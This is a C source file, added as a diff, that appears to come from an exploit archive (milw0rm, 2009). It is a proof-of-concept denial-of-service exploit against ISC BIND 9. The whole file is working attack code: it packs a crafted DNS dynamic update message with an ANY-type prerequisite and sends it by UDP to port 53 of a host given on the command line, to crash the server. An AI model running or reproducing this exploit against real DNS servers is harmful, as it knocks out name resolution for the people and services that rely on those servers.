@@ -1,0 +1,158 @@
+/*
+    ISC BIND 9 Remote Dynamic Update Message Denial of Service PoC
+    "Based on:
+    http://www.securityfocus.com/data/vulnerabilities/exploits/35848.txt
+    by kingcope - this is basically a rewrite of the above, lame i know, but fun enough
+    
+    for the [zone] argument you can try what is in the named.conf with "type master"
+*/
+ 
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+ 
+#define PORT 31337
+ 
+struct dnspkt1 {
+    unsigned short transact;
+    unsigned short flags;
+    unsigned short zones;
+    unsigned short pr;
+    unsigned short updates;
+    unsigned short rrs;
+};
+ 
+struct dnspkt2 {
+    unsigned short type;
+    unsigned short class;
+    unsigned short name2;
+    unsigned short type2;
+    unsigned short class2;
+    unsigned short ttl1;
+    unsigned short ttl2;
+    unsigned short datalen;
+    unsigned short name3;
+    unsigned short type3;
+    unsigned short class3;
+    unsigned short ttl3;
+    unsigned short ttl4;
+    unsigned short datalen2;
+};
+ 
+int packdomain(char * dest, const char *src)
+{
+  int i,n,cnt;
+ 
+  n=strlen(src);
+  dest[n+1]=0;  // terminator
+ 
+  cnt=0;
+  for (i=n; i>0; i--)
+  {
+    if (src[i-1]=='.')
+    {
+      dest[i]=cnt;
+      cnt=0;
+    }
+    else
+    {
+      dest[i]=src[i-1];
+      cnt++;
+    }
+  }
+  dest[0]=cnt;
+  return n+2;
+}
+ 
+int main(int argc, char **argv) {
+    int sockfd, clilen;
+    struct sockaddr_in serv_addr, cli_addr;
+    struct dnspkt1 d1;
+    struct dnspkt2 d2;
+ 
+    printf("ISC BIND 9 Remote Dynamic Update Message Denial of Service PoC\n");
+    printf("Based on:\n");
+    printf("http://www.securityfocus.com/data/vulnerabilities/exploits/35848.txt\n");
+    printf("by kingcope - this is basically a rewrite of the above, lame i know, but fun tough\n");
+ 
+    if (argc < 2) {
+        printf("usage: %s <host> [zone]\n", argv[0]);
+        return 0;
+    }
+ 
+        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(sockfd < 0) {
+                printf("error on socket() call");
+                return -1;
+        }
+ 
+        memset(&serv_addr, '\0', sizeof(serv_addr));
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_addr.s_addr = INADDR_ANY;
+        serv_addr.sin_port = htons(PORT);
+ 
+        if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
+                printf("error binding socket\n");
+                return -1;
+        }
+    
+        memset(&cli_addr, '\0', sizeof(cli_addr));
+        cli_addr.sin_family = AF_INET;
+        cli_addr.sin_addr.s_addr = inet_addr(argv[1]);
+        cli_addr.sin_port = htons(53);
+    
+    memset(&d1, '\0', sizeof(d1));
+    memset(&d2, '\0', sizeof(d2));
+    d1.transact = htons(0x1cd6);
+    d1.flags = htons(0x2800);
+    d1.zones = htons(0x0001);
+    d1.pr = htons(0x0001);
+    d1.updates = htons(0x0001);
+    d1.rrs = 0;
+    char *name = (char*)malloc(8096);
+    char nam[1024];
+ 
+    if (argc < 3) {
+        /* Not sure if this is right to set as default, have no clue about dns proto
+           It works for me.. */
+        strcpy(nam, "127.in-addr.arpa");
+    } else {
+        strncpy(nam, argv[2], sizeof(nam));
+        nam[sizeof(nam)-1]=0;
+    }
+ 
+    int n=packdomain(name, (char*)nam);
+    d2.type = htons(0x0006);
+    d2.class = htons(0x0001);
+    d2.name2 = htons(0xc00c);
+    d2.type2 = htons(0x00ff);
+    d2.class2 = htons(0x0001);
+    d2.datalen = 0;
+    d2.name3 = htons(0xc00c);
+    d2.type3 = htons(0x00ff);
+    d2.class3 = htons(0x00ff);
+    d2.ttl1 = 0;
+    d2.ttl2 = 0;
+    d2.ttl3 = 0;
+    d2.ttl4 = 0;
+    d2.datalen2 = 0;
+ 
+    char buffer[10000];
+    memcpy(buffer, &d1, sizeof(d1));
+    memcpy(buffer+sizeof(d1), name, n);
+    memcpy(buffer+sizeof(d1)+n, &d2, sizeof(d2));
+ 
+    clilen=sizeof(cli_addr);
+    
+    sendto(sockfd, buffer, sizeof(d1)+sizeof(d2)+n, 0, (struct sockaddr *)&cli_addr, sizeof(cli_addr));
+    printf("aight!\n");
+    return 0;
+}
+
+// milw0rm.com [2009-07-30]
